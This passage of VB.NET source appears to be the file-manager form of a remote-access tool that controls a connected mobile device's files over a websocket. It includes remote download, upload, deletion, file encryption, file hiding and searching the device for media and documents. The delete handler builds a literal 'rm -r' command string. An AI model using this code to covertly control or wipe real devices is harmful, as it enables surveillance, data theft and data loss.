                    Dim thumbnailFound As Boolean = False
                    Dim tagValue As Integer = CInt(FileRow.Thumbloaded)
                    Dim targetFilePath As String = listfilesvew.Tag & "/" & FileRow.Name
                    Dim fileDirectory As String = Btcli.userfolder & "\Thumbs" & listfilesvew.Tag.Replace("/", "\")

                    If tagValue <> 1 Then
                        Dim flag As Boolean = False
                        If targetFilePath.ToLower.EndsWith(".mp4") OrElse targetFilePath.ToLower.EndsWith(".mov") Then
                            Dim name As String = targetFilePath.Substring(targetFilePath.LastIndexOf("/") + 1)

                            If Directory.Exists(fileDirectory & "\" & name.Replace(".mp4", "").Replace(".mov", "")) Then
                                'ReadBitmapFromFile(fileDirectory & "\" & name.Replace(".mp4", "").Replace(".mov", "") & "\" & information.Name)

                                For Each vidfile As String In My.Computer.FileSystem.GetFiles(fileDirectory & "\" & name.Replace(".mp4", "").Replace(".mov", ""))
                                    Dim information = My.Computer.FileSystem.GetFileInfo(vidfile)

                                    Dim thumbnailPath As String = fileDirectory & "\" & name.Replace(".mp4", "").Replace(".mov", "") & "\" & information.Name
                                    If File.Exists(thumbnailPath) Then
                                        fileRow.Icon = ReadBitmapFromFile(thumbnailPath)
                                        fileRow.Thumbloaded = 1
                                        thumbnailFound = True
                                        Me.Invoke(Sub()
                                                      Me.listfilesvew.RefreshObject(fileRow)
                                                      'Me.listfilesvew.Refresh()
                                                      Me.listfilesvew.Update()
                                                  End Sub)
                                        flag = True

                                    End If
                                    Exit For
                                Next


                            End If
                        End If

                        If flag Then Continue For

                        If Directory.Exists(fileDirectory) Then
                            Dim thumbnailPath As String = Path.Combine(fileDirectory, Path.GetFileName(targetFilePath))
                            If File.Exists(thumbnailPath) Then
                                fileRow.Icon = ReadBitmapFromFile(thumbnailPath)
                                fileRow.Thumbloaded = 1
                                thumbnailFound = True
                                Me.Invoke(Sub()
                                              Me.listfilesvew.RefreshObject(fileRow)
                                              'Me.listfilesvew.Refresh()
                                              Me.listfilesvew.Update()
                                          End Sub)
                                Continue For
                            End If
                        End If
                    End If
                    ' Only process rows in the Details view
                    If loadimages AndAlso Not thumbnailFound Then

                        Dim fileName As String = FileRow.Name
                        Dim status As String = "null"

                        If ISupportedImages(fileName.ToLower()) Then
                            status = "false"
                        ElseIf ISupportedVideo(fileName.ToLower()) Then
                            status = "true"
                        End If

                        If status <> "null" AndAlso
                            Btcli.isConnected AndAlso
                            FileRow.Thumbloaded = 0 Then

                            FileRow.Thumbloaded = 2

                            ' Send command to load thumbnail from remote
                            Dim data As New With {
                                              .subcommand = "V",
                                              .newpth = targetFilePath,
                                              .ply = "0",
                                              .skidf = Btcli.SecoundIDF,
                                              .fstate = status
                                              }
                            Dim commandStr As String = FormatCommand("files", data)

                            Dim chatData As New Dictionary(Of String, Object) From {
                                              {"msg", wrk},
                                              {"cmnd", commandStr}
                                          }
                            BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
                            Threading.Thread.Sleep(10)
                        End If
                    End If



                    Threading.Thread.Sleep(1)
                Next

            Catch ex As Exception

                loadimages = False
            End Try
        End While
    End Sub

    Private Function GetVisibleItems(listView As FastObjectListView) As List(Of OLVListItem)
        Dim visibleItems As New List(Of OLVListItem)()
        Try

            If listView Is Nothing OrElse listView.TopItem Is Nothing OrElse listView.ClientRectangle = Nothing Then
                Return Nothing
            End If

            Dim topIndex As Integer = listView.TopItem.Index
            Dim bottomY As Integer = listView.ClientRectangle.Bottom

            For i As Integer = topIndex To listView.Items.Count - 1
                Dim item As OLVListItem = CType(listView.Items(i), OLVListItem)

                ' Stop when item is out of visible bounds
                If item.Bounds.Top > bottomY Then
                    Exit For
                End If

                visibleItems.Add(item)
            Next
        Catch ex As Exception

        End Try

        Return visibleItems
    End Function


    Private Sub FolderDownloadsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FolderDownloadsToolStripMenuItem.Click
        Try
            Dim down As String = Btcli.userfolder & "\" & "Downloads"

            If Not IO.Directory.Exists(down) Then

                IO.Directory.CreateDirectory(down)

            End If

            Process.Start(down)
        Catch ex As Exception

        End Try
    End Sub

    Private Sub OpenToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenToolStripMenuItem.Click
        If listfilesvew.SelectedObjects.Count = 1 Then
            If Btcli.isConnected Then
                ' Iterate through selected objects
                For Each selectedObject As FileRow In listfilesvew.SelectedObjects
                    If selectedObject IsNot Nothing AndAlso selectedObject.IsFile Then
                        Dim targetfilepath As String = $"{listfilesvew.Tag}/{selectedObject.Name}"

                        Dim data As New With {
                        .subcommand = "O",
                        .newpth = targetfilepath
                    }
                        commandfiles(data)
                    End If
                Next
            End If
        End If
    End Sub


    Private Sub commandfiles(data As Object)
        Dim commandstr As String = FormatCommand("files", data)


        Dim chatData As New Dictionary(Of String, Object) From {
                                                {"msg", wrk},
                                                {"cmnd", commandstr}
                    }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        If listfilesvew.SelectedObjects.Count > 0 Then
            If Btcli.isConnected Then
                Clipboard.Clear()
                ' Iterate through selected objects
                For Each selectedObject As FileRow In listfilesvew.SelectedObjects
                    If selectedObject IsNot Nothing Then
                        Dim targetfilepath As String = $"{listfilesvew.Tag}/{selectedObject.Name}"

                        ' Determine if the item is a file or folder
                        Dim isFile As Boolean = selectedObject.IsFile

                        ' Add to clipboard based on file/folder type
                        Clipboard.Add({"co", isFile, Format_Space(targetfilepath)})
                    End If
                Next
            End If
        End If
    End Sub

    Private Function Format_Space(ByVal prm As String) As String
        If prm.Contains(Space(1)) Then
            prm = prm.Replace(Space(1), "(U+0020)".ToLower)
        End If
        Return prm
    End Function

    Private Sub CutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CutToolStripMenuItem.Click
        If listfilesvew.SelectedObjects.Count > 0 Then
            If Btcli.isConnected Then
                Clipboard.Clear()
                ' Iterate through selected objects
                For Each selectedObject As FileRow In listfilesvew.SelectedObjects
                    If selectedObject IsNot Nothing Then
                        Dim targetfilepath As String = $"{listfilesvew.Tag}/{selectedObject.Name}"

                        ' Determine if the item is a file or folder
                        Dim isFile As Boolean = selectedObject.IsFile

                        ' Add to clipboard for cutting
                        Clipboard.Add({"cu", isFile, Format_Space(targetfilepath)})
                    End If
                Next
            End If
        End If
    End Sub


    Private Sub PasteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasteToolStripMenuItem.Click
        If Clipboard.Count > 0 Then

            Dim destinationFolder As String = Format_Space(listfilesvew.Tag)
            Dim array_copys As New List(Of String)
            Dim array_cuts As New List(Of String)

            ' Process each item in Clipboard
            For Each i In Clipboard
                Dim clipdata As Array = CType(i, Array)

                ' Example for adding to Clipboard: Clipboard.Add({"COPY", isFile, Format_Space(targetfilepath)})

                If clipdata(0).ToString() = "co" Then
                    ' Push to array_copys
                    array_copys.Add(clipdata(2).ToString())
                ElseIf clipdata(0).ToString() = "cu" Then
                    ' Push to array_cuts
                    array_cuts.Add(clipdata(2).ToString())
                End If
            Next

            ' Prepare strings for "COPY" and "CUT" actions
            Dim string_copys As String = ""
            Dim string_cuts As String = ""

            ' Join array items with <P> and call CopyCutFile if there are items
            If array_copys.Count > 0 Then
                string_copys = String.Join("<P>", array_copys)

                Dim chatData As New Dictionary(Of String, Object) From {
                {"msg", filecomnd},
                {"tp", destinationFolder}, ' Target path
                {"state", "co"}, ' State based on type
                {"fp", string_copys} ' From paths string
                }
                BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)

            End If

            If array_cuts.Count > 0 Then
                string_cuts = String.Join("<P>", array_cuts)
                Dim chatData As New Dictionary(Of String, Object) From {
                {"msg", filecomnd},
                {"tp", destinationFolder}, ' Target path
                {"state", "cu"}, ' State based on type
                {"fp", string_cuts} ' From paths string
                }
                BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
            End If

            Clipboard.Clear()


        End If

    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameToolStripMenuItem.Click
        If listfilesvew.SelectedObjects.Count = 1 Then
            If Btcli.isConnected Then



                ' Iterate through the selected objects
                For Each selectedObject As FileRow In listfilesvew.SelectedObjects
                    If selectedObject IsNot Nothing Then

                        Dim btinput As New myinputs
                        btinput.msgtitle.Text = "File new name"
                        btinput.inputtext.Text = selectedObject.Name
                        btinput.inputtext.Watermark = "ex: image.jpg"
                        If btinput.ShowDialog <> DialogResult.OK Then
                            Return
                        End If

                        Dim newname As String = btinput.inputtext.Text

                        If isEmpty(newname) Then
                            BTAlerter.infos("Enter new name first")
                            Return
                        End If

                        ' Construct the old and new file paths
                        Dim targetfilepath As String = $"{listfilesvew.Tag}/{selectedObject.Name}"
                        Dim newfilepath As String = $"{listfilesvew.Tag}/{newname}"

                        ' Prepare the data for the renaming operation
                        Dim data As New With {
                                .subcommand = "E",
                                .old_name = targetfilepath,
                                .new_name = newfilepath
                        }

                        ' Execute the command to rename the file/folder
                        commandfiles(data)
                    End If
                Next
            End If
        End If
    End Sub


    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
        If listfilesvew.SelectedObjects.Count > 0 Then
            If Btcli.isConnected Then

                Dim btinput As New myinputs
                btinput.msgtitle.Text = "Encryption key"
                btinput.inputtext.Text = ""
                btinput.inputtext.Watermark = "ex: BT123456"

                If btinput.ShowDialog <> DialogResult.OK Then
                    Return
                End If

                Dim thekey As String = btinput.inputtext.Text

                If isEmpty(thekey) Then
                    BTAlerter.infos("Enter key first")
                    Return
                End If

                Dim pathsgroup As String = ""

                ' Iterate through each selected object in the VirtualMode list
                For Each selectedObject As FileRow In listfilesvew.SelectedObjects
                    If selectedObject IsNot Nothing Then
                        ' Construct the file path
                        Dim targetfilepath As String = $"{listfilesvew.Tag}/{selectedObject.Name}"
                        pathsgroup += targetfilepath & "<P>"
                    End If
                Next

                If isEmpty(pathsgroup) Then
                    Return
                End If

                ' Prepare data for encryption
                Dim data As New With {
                .subcommand = "EN",
                .encpass = thekey,
                .encpaths = pathsgroup
            }

                ' Send encryption command
                commandfiles(data)

            End If
        End If
    End Sub


    Private Sub DecodeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecodeToolStripMenuItem.Click
        If listfilesvew.SelectedObjects.Count > 0 Then
            If Btcli.isConnected Then

                Dim btinput As New myinputs
                btinput.msgtitle.Text = "Decryption key"
                btinput.inputtext.Text = ""
                btinput.inputtext.Watermark = "ex: BT123456"

                If btinput.ShowDialog <> DialogResult.OK Then
                    Return
                End If

                Dim thekey As String = btinput.inputtext.Text

                If isEmpty(thekey) Then
                    BTAlerter.infos("Enter key first")
                    Return
                End If

                Dim pathsgroup As String = ""
                Dim outpaths As String = ""

                ' Loop through the selected objects
                For Each selectedObject As FileRow In listfilesvew.SelectedObjects
                    If selectedObject IsNot Nothing Then
                        ' Construct the file path
                        Dim targetfilepath As String = $"{listfilesvew.Tag}/{selectedObject.Name}"
                        pathsgroup += targetfilepath & "<P>"

                        ' Handle decryption paths based on file extension
                        Dim concat As String = ".BTE"
                        If targetfilepath.EndsWith(concat) Then
                            Dim iLast As Integer = targetfilepath.LastIndexOf(concat)
                            outpaths += targetfilepath.Substring(0, iLast) & "<P>"
                        Else
                            outpaths += targetfilepath & ".decrypt" & "<P>"
                        End If
                    End If
                Next

                If isEmpty(pathsgroup) Or isEmpty(outpaths) Then
                    Return
                End If

                ' Prepare data for decryption
                Dim data As New With {
                .subcommand = "DE",
                .decpass = thekey,
                .inpath = pathsgroup,
                .decpaths = outpaths
            }

                ' Send decryption command
                commandfiles(data)

            End If
        End If
    End Sub


    Private Sub ZipToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ZipToolStripMenuItem.Click
        If listfilesvew.SelectedObjects.Count > 0 Then
            If Btcli.isConnected Then

                Dim btinput As New myinputs
                btinput.msgtitle.Text = "Zip file name"
                btinput.inputtext.Text = ""
                btinput.inputtext.Watermark = "ex: files1.zip"

                If btinput.ShowDialog <> DialogResult.OK Then
                    Return
                End If

                Dim zipname As String = btinput.inputtext.Text

                If isEmpty(zipname) Then
                    BTAlerter.infos("Enter name first")
                    Return
                End If

                Dim pathsgroup As String = ""

                ' Loop through the selected objects
                For Each selectedObject As FileRow In listfilesvew.SelectedObjects
                    If selectedObject IsNot Nothing Then

                        If Not selectedObject.IsFile Then
                            Continue For
                        End If

                        ' Construct the file path
                        Dim targetfilepath As String = $"{listfilesvew.Tag}/{selectedObject.Name}"

                        ' Add the file path to the pathsgroup
                        pathsgroup += targetfilepath & "<P>"
                    End If
                Next

                If isEmpty(pathsgroup) Then
                    Return
                End If

                ' Ensure the zip name ends with ".zip"
                If Not zipname.EndsWith(".zip") Then
                    zipname = zipname + ".zip"
                End If

                ' Prepare data for the zip command
                Dim data As New With {
                .subcommand = "Z",
                .zname = zipname,
                .zpaths = pathsgroup
            }

                ' Send the zip command
                commandfiles(data)

            End If
        End If
    End Sub


    Private Sub UnZipToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UnZipToolStripMenuItem.Click
        If listfilesvew.SelectedObjects.Count > 0 Then
            If Btcli.isConnected Then
                For Each selectedObject As FileRow In listfilesvew.SelectedObjects
                    If selectedObject IsNot Nothing Then


                        If selectedObject.IsFile Then
                            ' Construct the file path
                            Dim targetfilepath As String = $"{listfilesvew.Tag}/{selectedObject.Name}"

                            ' Prepare data for the unzip command
                            Dim data As New With {
                            .subcommand = "UZ",
                            .extpath = listfilesvew.Tag,
                            .zpath = targetfilepath
                        }

                            ' Send the unzip command
                            commandfiles(data)
                        End If
                    End If
                Next
            End If
        End If
    End Sub


    Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click
        If listfilesvew.SelectedObjects.Count > 0 Then
            If Btcli.isConnected Then
                ' Iterate over each selected object in the ListView
                For Each selectedObject As FileRow In listfilesvew.SelectedObjects
                    If selectedObject IsNot Nothing Then

                        Dim targetfilepath As String = $"{listfilesvew.Tag}/{selectedObject.Name}"
                        Dim ftypestr As String = "fi"

                        ' If it's not a file (tg <> "1"), treat it as a folder (fo)
                        If Not selectedObject.IsFile Then
                            ftypestr = "fo"
                            targetfilepath = $"rm -r {Format_Space(listfilesvew.Tag & "/" & selectedObject.Name)}"
                        End If

                        ' Prepare the command to delete the item
                        Dim data As New With {
                        .subcommand = "R",
                        .fpath = targetfilepath,
                        .ftype = ftypestr
                        }

                        ' Send the delete command
                        commandfiles(data)

                        ' Remove the item from the ListView (virtual mode)
                        ' Note: Virtual Mode doesn't update the ListView directly, so this is just for UI updates
                        listfilesvew.RemoveObject(selectedObject)
                    End If
                Next
            End If
        End If
    End Sub


    Private Sub AddFilesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddFilesToolStripMenuItem.Click
        If Btcli.isConnected Then

            Dim btinput As New myinputs
            btinput.msgtitle.Text = "New file name"
            btinput.inputtext.Text = ""
            btinput.checkfolder.Visible = True
            btinput.inputtext.Watermark = "ex: notes.txt OR folder1"
            If btinput.ShowDialog <> DialogResult.OK Then
                Return
            End If

            Dim newname As String = btinput.inputtext.Text

            If isEmpty(newname) Then
                BTAlerter.infos("Enter new name first")
                Return
            End If

            Dim newfilepath As String = listfilesvew.Tag & "/" & newname


            Dim data As New With {
                            .subcommand = "CR",
                            .isfolder = btinput.checkfolder.Checked.ToString(),
                            .nfpath = newfilepath
                        }
            commandfiles(data)
        End If
    End Sub

    Private Sub HideToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideToolStripMenuItem.Click
        If listfilesvew.SelectedObjects.Count > 0 Then
            If Btcli.isConnected Then
                ' Iterate over each selected object in the ListView
                For Each selectedObject As FileRow In listfilesvew.SelectedObjects
                    If selectedObject IsNot Nothing Then
                        ' Get the old name (path) and construct the new hidden name
                        Dim oldname As String = $"{listfilesvew.Tag}/{selectedObject.Name}"
                        Dim newfname As String = $"{listfilesvew.Tag}/.{selectedObject.Name}"

                        ' Prepare the command to rename the file/folder
                        Dim data As New With {
                        .subcommand = "E",
                        .old_name = oldname,
                        .new_name = newfname
                    }

                        ' Send the rename command to hide the file/folder
                        commandfiles(data)
                    End If
                Next
            End If
        End If
    End Sub


    Private Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem.Click
        If listfilesvew.SelectedObjects.Count > 0 Then
            If Btcli.isConnected Then
                ' Iterate over each selected object in the ListView
                For Each selectedObject As FileRow In listfilesvew.SelectedObjects
                    If selectedObject IsNot Nothing Then
                        ' Get the name of the selected file/folder
                        Dim name As String = selectedObject.Name

                        ' Check if the name starts with a dot (hidden file/folder)
                        If name.Trim.Chars(0) = "."c Then
                            Dim formatName As String = Nothing
                            Dim status As Boolean = False

                            ' Construct the new name by removing the leading dot
                            For c As Integer = 0 To name.Length - 1
                                If Not name.Trim.Chars(c) = "."c Then
                                    formatName &= name.Trim.Chars(c)
                                    status = True
                                ElseIf status Then
                                    formatName &= name.Trim.Chars(c)
                                End If
                            Next

                            ' Prepare the full paths for the rename operation
                            Dim newname As String = $"{listfilesvew.Tag}/{formatName}"
                            Dim oldname As String = $"{listfilesvew.Tag}/{name}"

                            ' Prepare the command data for renaming the file/folder
                            Dim data As New With {
                            .subcommand = "E",
                            .old_name = oldname,
                            .new_name = newname
                        }

                            ' Send the command to show the file/folder by renaming it
                            commandfiles(data)
                        End If
                    End If
                Next
            End If
        End If
    End Sub



    Public downloadsrows As New Dictionary(Of String, DataGridViewRow)
    Private Sub DownloadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadToolStripMenuItem.Click
        startdownload("n")
    End Sub


    'FastType y = yes,n = no
    'FastType yes = compress only support video images
    Private Sub startdownload(FastType As String)
        Try
            If listfilesvew.SelectedObjects.Count > 0 Then
                If Btcli.isConnected Then

                    ' Iterate over each selected object in the ListView
                    For Each selectedObject As FileRow In listfilesvew.SelectedObjects
                        If selectedObject IsNot Nothing Then
                            ' Access the tag associated with the selected object


                            If selectedObject.IsFile Then

                                ' Build the full target file path
                                Dim targetfilepath As String = $"{listfilesvew.Tag}/{selectedObject.Name}"
                                ' Get the filename and filesize from the selected object
                                Dim filename As String = selectedObject.Name
                                Dim filesize As String = selectedObject.SizeDescription

                                ' Add a new row to the DataGridView for the download
                                Dim indexrow As Integer = DGVDATA.Rows.Add(filename, targetfilepath, filesize, Connectingstr, "0%")

                                ' Set the new row's tag and store it in the download rows dictionary
                                Dim newRow As DataGridViewRow = DGVDATA.Rows(indexrow)
                                newRow.Tag = targetfilepath

                                downloadsrows(targetfilepath) = newRow

                                Dim reqthread As New Thread(Async Sub()
                                                                Dim datajoin As String = Await JoinServer(New With {
                                                                      .case = "join",
                                                                      .ping = "0",
                                                                      .ismain = "0",
                                                                      .chk = BTEngine.MainForm.Mainnextkey
                                                                }, BTEngine.MainForm.MainhttpClient)


                                                                Dim socketidf As String = Btcli.SecoundIDF
                                                                Dim websockclient As WebSocketClient = Nothing
                                                                Dim result As JObject = JObject.Parse(datajoin)
                                                                If result("Success") IsNot Nothing Then
                                                                    Dim datastr As String = result("Success").ToString.Trim("""")
                                                                    Log_d("Cli IDF websock", datastr)
                                                                    'Main_IDF = datastr

                                                                    websockclient = New WebSocketClient(downfilrstr, Btcli.address)

                                                                    Dim connectionThread = New Thread(Sub() websockclient.Connect(datastr))
                                                                    connectionThread.IsBackground = True
                                                                    connectionThread.Start()

                                                                    Do
                                                                        Thread.Sleep(1)
                                                                    Loop While Not websockclient.IsConnected

                                                                    Log_d("IDF Ready to use", datastr)
                                                                    socketidf = datastr
                                                                End If


                                                                Me.Invoke(Sub()
                                                                              newRow.Cells(0).Tag = websockclient
                                                                          End Sub)

                                                                ' Prepare chat data for the command
                                                                Dim chatData As New Dictionary(Of String, Object) From {
                                                                    {"msg", fetchcomnd},
                                                                    {"extradata", targetfilepath},
                                                                    {"skidf", socketidf},
                                                                    {"comp", FastType},
                                                                    {"subc", "file"}
                                                                }

                                                                ' Execute the command
                                                                BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)

                                                            End Sub)
                                reqthread.IsBackground = True
                                reqthread.Start()



                            End If
                        End If
                    Next
                End If
            End If
        Catch ex As Exception

        End Try
    End Sub


    Private Sub ClearAllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClearAllToolStripMenuItem.Click
        If DGVDATA.Rows.Count > 0 Then
            For index = DGVDATA.Rows.Count - 1 To 0 Step -1
                Try
                    Dim Ro As DataGridViewRow = DGVDATA.Rows(index)
                    If Ro.Tag = "-1" Then
                        DGVDATA.Rows.Remove(Ro)
                    End If
                Catch ex As Exception

                End Try
            Next

        End If
    End Sub

    Private Sub DrakeUIButtonIcon7_Click(sender As Object, e As EventArgs) Handles clrbtn.Click
        logscannertext.Text = "• Click Search now to start"
    End Sub

    Private Sub srchfilsbtn_Click(sender As Object, e As EventArgs) Handles srchfilsbtn.Click

        Try
            Dim searchfor As String = Nothing


            Select Case comsrchfor.Text
                Case "Images"
                    searchfor = "i"
                    Exit Select
                Case "Videos"
                    searchfor = "v"
                    Exit Select
                Case "Audios"
                    searchfor = "a"
                    Exit Select
                Case "Documents"
                    searchfor = "d"
                    Exit Select
                Case Else
                    Exit Select
            End Select
            If searchfor Is Nothing Then
                BTAlerter.infos("Select what to search For")
                Return
            End If
            Dim chatData As New Dictionary(Of String, Object) From {
                             {"msg", "srh"},
                             {"sfor", searchfor}
                        }
            BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)

        Catch ex As Exception
            MsgBox("error:" + ex.Message)
        End Try
    End Sub

    Private Sub UploadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadToolStripMenuItem.Click
        FilesUpload.Title = "select file to upload"

        FilesUpload.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)

        FilesUpload.Filter = "all Files|*.*"

        FilesUpload.FileName = String.Empty

        FilesUpload.Multiselect = True

        If FilesUpload.ShowDialog() = DialogResult.OK Then

            Dim ar As String() = FilesUpload.FileNames

            If ar.Length > 0 Then

                For Each i In ar
                    Try
                        Dim FI As New IO.FileInfo(i)

                        Dim funm As String = FI.FullName

                        Dim uploaderform As New uploader
                        uploaderform.Btcli = Btcli
                        uploaderform.filePath = funm
                        uploaderform.filename = FI.Name
                        uploaderform.savepath = listfilesvew.Tag & "/" & FI.Name
                        uploaderform.mobid = Btcli.mobid


                        uploaderform.Show()

                    Catch ex As Exception

                    End Try

                Next

            End If


        End If
    End Sub

    Private Sub DrakeUIButtonIcon8_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon8.Click
        If Not viwimage.Image Is Nothing Then
            Dim Bmap = New Bitmap(viwimage.Image)
            Bmap.RotateFlip(RotateFlipType.Rotate90FlipNone)
            viwimage.Image = Bmap
        End If
    End Sub

    Private Sub DrakeUIButtonIcon5_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon5.Click
        startdownload("n")
    End Sub

    Private Sub listfilesvew_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles listfilesvew.MouseDoubleClick
        Try
            If listfilesvew.SelectedObjects.Count > 0 Then
                ' Get the first selected object
                Dim selectedFileRow As FileRow = CType(listfilesvew.SelectedObjects(0), FileRow)

                If selectedFileRow IsNot Nothing AndAlso Not selectedFileRow.IsFile Then
                    If Btcli.isConnected Then

                        Dim thepath As String = listfilesvew.Tag.ToString

                        navigateto(Pnext(listfilesvew.Tag, selectedFileRow.Name))

                        If visited.ContainsKey(thepath) Then
                            visited(thepath) = listfilesvew.SelectedIndices(0)
                        Else
                            visited.Add(thepath, listfilesvew.SelectedIndices(0))
                        End If



                    End If
                End If
            End If
        Catch ex As Exception

        End Try
    End Sub


    Private Sub emptysearch_Click(sender As Object, e As EventArgs) Handles emptysearch.Click
        searchtext.Text = ""

    End Sub

    Private Sub DrakeUIButtonIcon7_Click_1(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon7.Click
        If listfilesvew.RowHeight = 25 Then
            listfilesvew.RowHeight = 75
            DrakeUIButtonIcon7.Symbol = 61542
        Else
            listfilesvew.RowHeight = 25

            DrakeUIButtonIcon7.Symbol = 61502

        End If
    End Sub

    Private Sub StopDownloadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StopDownloadToolStripMenuItem.Click
        If DGVDATA.Rows.Count > 0 AndAlso DGVDATA.SelectedRows.Count > 0 Then
            For Each Ro As DataGridViewRow In DGVDATA.SelectedRows
                Try

                    If Ro.Cells(0).Tag IsNot Nothing Then
                        Dim sockclient As WebSocketClient = DirectCast(Ro.Cells(0).Tag, WebSocketClient)
                        If sockclient IsNot Nothing Then
                            sockclient.Disconnect(downfilrstr, Btcli.address)

                            Ro.Cells(3).Value = "Stop"
                            Ro.DefaultCellStyle.ForeColor = Color.Red ' Completed download
                            Ro.Tag = "-1"
                        End If
                    End If
                Catch ex As Exception

                End Try
            Next

        End If
    End Sub

    Private Sub PreviewToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PreviewToolStripMenuItem.Click
        If listfilesvew.SelectedObjects.Count > 0 Then
            If Btcli.isConnected Then

                Dim skiponlyvid As Boolean = False
                ' Iterate over each selected object in the ListView
                For Each selectedObject As FileRow In listfilesvew.SelectedObjects
                    If selectedObject IsNot Nothing Then
                        ' Access the tag associated with the selected object


                        If selectedObject.IsFile Then

                            ' Build the full target file path
                            Dim targetfilepath As String = $"{listfilesvew.Tag}/{selectedObject.Name}"

                            Dim targetfilename As String = selectedObject.Name

                            Dim status As Object = "null"
                            If ISupportedVideo(targetfilename.ToLower) Then
                                status = "true"
                                skiponlyvid = True
                            End If

                            If status <> "null" AndAlso Btcli.isConnected Then

                                Dim handle As String = "BT-" & "vidplay-" & StringToMD5(targetfilepath)

                                Dim vidp As vidplayer = My.Application.OpenForms(handle)

                                If vidp Is Nothing Then
                                    vidp = New vidplayer(targetfilepath,
                                                          targetfilename,
                                                          Btcli.mobid,
                                                          Btcli.address,
                                                          Btcli.SecoundIDF)
                                    vidp.Name = handle
                                    vidp.Show()
                                Else
                                    vidp.TopMost = True
                                    vidp.TopMost = False
                                End If



                            End If

                        End If
                    End If
                Next

                If Not skiponlyvid Then
                    BTAlerter.infos("only Support videos")
                End If

            End If
        End If
    End Sub

    Private Sub filesmanager_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        Try
            listfilesvew.ClearObjects()
            listfilesvew.Dispose()
        Catch ex As Exception

        End Try

    End Sub

    Private Sub PlaySoundToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PlaySoundToolStripMenuItem.Click
        If listfilesvew.SelectedObjects.Count = 1 Then
            If Btcli.isConnected Then
                ' Iterate through selected objects
                For Each selectedObject As FileRow In listfilesvew.SelectedObjects
                    If selectedObject IsNot Nothing AndAlso selectedObject.IsFile Then
                        Dim targetfilepath As String = $"{listfilesvew.Tag}/{selectedObject.Name}"

                        Dim data As New With {
                        .subcommand = "P",
                        .newpth = targetfilepath
                    }
                        commandfiles(data)
                    End If
                Next
            End If
        End If
    End Sub

    Private Sub ToolStripMenuItem7_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem7.Click
        startdownload("y")
    End Sub
End Class